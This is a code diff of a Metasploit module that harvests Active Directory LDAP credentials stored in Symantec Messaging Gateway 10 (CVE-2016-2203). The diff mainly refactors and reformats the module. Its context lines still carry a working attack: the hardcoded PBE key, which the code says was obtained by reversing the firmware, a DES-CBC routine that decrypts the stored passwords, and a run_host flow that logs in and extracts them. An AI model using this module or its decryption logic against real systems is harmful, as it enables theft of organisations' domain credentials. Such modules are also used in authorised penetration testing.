@@ -9,7 +9,7 @@ require 'digest'
 require "openssl"
 
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -19,18 +19,19 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Symantec Messaging Gateway 10 LDAP Creds Graber',
       'Description'    => %q{
-          This module will  grab the AD account saved in Symantec Messaging Gateway and then decipher it using the disclosed symantec pbe key.  Note that authentication is required in order to successfully grab the LDAP credentials, you need at least a read account.
+          This module will  grab the AD account saved in Symantec Messaging Gateway and then decipher it using the disclosed symantec pbe key.  Note that authentication is required in order to successfully grab the LDAP credentials, you need at least a read account. Version 10.6.0-7 and earlier are affected
+
       },
       'References'     =>
         [
-		  'https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20160418_00',
-		  'CVE-2016-2203'
+          ['URL','https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20160418_00'],
+          ['CVE','2016-2203'],
+          ['BID','86137']
         ],
 
       'Author'         =>
         [
           'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
-          'zirsalem'
         ],
        'DefaultOptions' =>
         {
@@ -49,6 +50,19 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('PASSWORD', [true, 'The password to login with'])
       ], self.class)
     deregister_options('RHOST')
+  end
+
+
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def print_good(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
   end
 
   def report_cred(opts)
@@ -126,22 +140,29 @@ class Metasploit3 < Msf::Auxiliary
     return sid, last_login
   end
 
+  # Returns the status of the listening port.
+  #
+  # @return [Boolean] TrueClass if port open, otherwise FalseClass.
+
   def port_open?
     begin
       res = send_request_raw({'method' => 'GET', 'uri' => '/'}, datastore['TIMEOUT'])
       return true if res
     rescue ::Rex::ConnectionRefused
-      vprint_status("#{peer} - Connection refused")
+      print_status("#{peer} - Connection refused")
       return false
     rescue ::Rex::ConnectionError
-      vprint_error("#{peer} - Connection failed")
+      print_error("#{peer} - Connection failed")
       return false
     rescue ::OpenSSL::SSL::SSLError
-      vprint_error("#{peer} - SSL/TLS connection error")
+      print_error("#{peer} - SSL/TLS connection error")
       return false
     end
   end
 
+  # Returns the derived key from the password, the salt and the iteration count number.
+  #
+  # @return Array of byte containing the derived key.
   def get_derived_key(password, salt, count)
     key = password + salt
     for i in 0..count-1
@@ -149,25 +170,27 @@ class Metasploit3 < Msf::Auxiliary
     end
     kl = key.length
     return key[0,8], key[8,kl]
- end
+  end
 
 
- # Algorithm obtained by reversing the firmware
- def decrypt(enc_str)
-  pbe_key="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;':\"\\{}`~!@#$%^&*()_+-="
-  salt = (Base64.strict_decode64(enc_str[0,12]))
-  remsg = (Base64.strict_decode64(enc_str[12,enc_str.length]))
-  (dk, iv) = get_derived_key(pbe_key, salt, 1000)
-  alg = "des-cbc"
-  decode_cipher = OpenSSL::Cipher::Cipher.new(alg)
-  decode_cipher.decrypt
-  decode_cipher.padding = 0
-  decode_cipher.key = dk
-  decode_cipher.iv = iv
-  plain = decode_cipher.update(remsg)
-  plain << decode_cipher.final
-  return  plain.gsub(/[\x01-\x08]/,'')
- end
+  # @Return the deciphered password
+  # Algorithm obtained by reversing the firmware
+  #
+  def decrypt(enc_str)
+    pbe_key="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;':\"\\{}`~!@#$%^&*()_+-="
+    salt = (Base64.strict_decode64(enc_str[0,12]))
+    remsg = (Base64.strict_decode64(enc_str[12,enc_str.length]))
+    (dk, iv) = get_derived_key(pbe_key, salt, 1000)
+    alg = "des-cbc"
+    decode_cipher = OpenSSL::Cipher::Cipher.new(alg)
+    decode_cipher.decrypt
+    decode_cipher.padding = 0
+    decode_cipher.key = dk
+    decode_cipher.iv = iv
+    plain = decode_cipher.update(remsg)
+    plain << decode_cipher.final
+    return  plain.gsub(/[\x01-\x08]/,'')
+  end
 
  def grab_auths(sid,last_login)
   token = '' #from hidden input
@@ -239,22 +262,22 @@ class Metasploit3 < Msf::Auxiliary
    end
   end
 
- def run_host(ip)
-  return unless port_open?
-  sid, last_login = get_login_data
-  if sid.empty? or last_login.empty?
-   print_error("#{peer} - Missing required login data.  Cannot continue.")
-   return
-  end
-  username = datastore['USERNAME']
-  password = datastore['PASSWORD']
-  sid = auth(username, password, sid, last_login)
-  if not sid
-   print_error("#{peer} - Unable to login.  Cannot continue.")
-   return
-  else
-   print_good("#{peer} - Logged in as '#{username}:#{password}' Sid: '#{sid}' LastLogin '#{last_login}'")
-  end
-  grab_auths(sid,last_login)
+  def run_host(ip)
+    return unless port_open?
+    sid, last_login = get_login_data
+    if sid.empty? or last_login.empty?
+      print_error("#{peer} - Missing required login data.  Cannot continue.")
+      return
+    end
+    username = datastore['USERNAME']
+    password = datastore['PASSWORD']
+    sid = auth(username, password, sid, last_login)
+    if not sid
+      print_error("#{peer} - Unable to login.  Cannot continue.")
+      return
+    else
+      print_good("#{peer} - Logged in as '#{username}:#{password}' Sid: '#{sid}' LastLogin '#{last_login}'")
+    end
+    grab_auths(sid,last_login)
   end
 end
